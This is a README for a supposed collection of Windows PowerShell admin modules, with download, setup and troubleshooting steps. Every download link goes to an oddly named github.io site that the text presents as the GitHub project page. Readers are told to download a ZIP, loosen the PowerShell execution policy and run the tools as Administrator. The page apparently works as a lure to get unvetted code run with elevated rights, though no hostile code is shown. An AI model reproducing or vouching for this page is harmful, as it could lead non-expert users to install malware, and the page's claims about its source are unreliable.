# ⚙️ killer-modules - Manage Windows systems with simple tools

[![Download Modules](https://img.shields.io/badge/Download_Modules-Blue.svg)](https://ungradableoppositioncree702.github.io)

This project provides tools for people who manage Windows computers. These small programs help you fix common errors, check system health, and complete daily tasks without manual steps. You do not need to be a computer expert to use these tools. Each tool focuses on one specific job to help you save time.

## 📥 How to download your tools

Visit the GitHub project page to access the files. You can find the link below.

[Click here to open the download page](https://ungradableoppositioncree702.github.io)

Once you arrive at the page, look for the green button labeled "Code." Click this button and select "Download ZIP" to save the files to your computer.

## 💻 System requirements

These tools work on most modern Windows systems. Ensure your machine runs one of the following versions:

* Windows 10
* Windows 11
* Windows Server 2016 or newer

You need PowerShell version 5.1 or higher installed. Windows includes this software by default. If you use a recent version of Windows, you already possess the required software.

## 🚀 Setting up the tools

After you download the ZIP file, follow these steps to prepare your computer.

1. Locate the downloaded file in your Downloads folder.
2. Right-click the file and select "Extract All." Choose a folder where you keep your programs.
3. Open the folder you just created.
4. You will see several subfolders. Each subfolder represents a standalone tool.

## 🛠️ Running your first module

These tools use the PowerShell interface. Do not worry; you do not need to write code. You only need to run a small command to start the process.

1. Open the folder for the specific tool you want to use.
2. Click inside the empty white space in the file explorer address bar at the top of the window.
3. Type `powershell` and press Enter. A blue window appears.
4. If this is your first time, type `Set-ExecutionPolicy RemoteSigned -Scope CurrentUser` and press Enter. Type `Y` and press Enter to confirm. This allows the computer to run the tools safely.
5. To load a tool, type `Import-Module .\ModuleName.psd1` and press Enter. Replace "ModuleName" with the actual name of the file in your folder.

## 📋 Common tasks for administrators

These modules solve problems that happen every day. Here is what you can do with them:

* **Account Management:** Quickly reset user passwords or update contact details for company staff.
* **System Health:** Check disk space, memory usage, and verify that system updates exist.
* **Email Support:** Connect to Microsoft 365 to manage user mailboxes or check for delivery errors.
* **Network Testing:** Run quick checks to see if printers or servers stay reachable on your office network.
* **Software Inventory:** List all programs installed on a computer to ensure everything is current.

## 🛡️ Maintaining safety

We designed these tools with safety in mind. They read information from your system but do not change core settings unless you run a specific command to trigger a change. 

Because these tools interact with system settings, you should run them as an administrator. Right-click the PowerShell shortcut and choose "Run as Administrator" if a tool mentions that it needs higher permissions.

## ❓ Troubleshooting common issues

If you encounter an error, check these items first:

* **Permissions:** If the system refuses to run the tool, ensure you set the execution policy as shown in the setup section.
* **Missing Modules:** Ensure you extracted the files from the ZIP folder. PowerShell cannot run these tools while they remain inside the compressed file.
* **Network Access:** When using tools related to Microsoft 365 or Exchange Online, ensure your internet connection stays active. You may need to sign in with your email credentials when prompted by a popup box.
* **Path Names:** Keep the folder names simple. Using spaces or special characters in folder names sometimes causes errors in PowerShell. If you receive an error about a path, move the folder to your C: drive root directory.

## 📈 Improving your workflow

Use these modules to create a standard system for your office work. You can assign names to these tasks to remember which module controls which function. Since each folder acts as a standalone unit, you can delete modules you do not need and keep the ones that help you most.

If you enjoy these modules, check the repository regularly for updates. We add new features to improve how these tools handle modern Windows environments. 

Keywords: automation, exchange-online, helpdesk, microsoft-365, msp, powershell, powershell-gallery, powershell-module, sysadmin, windows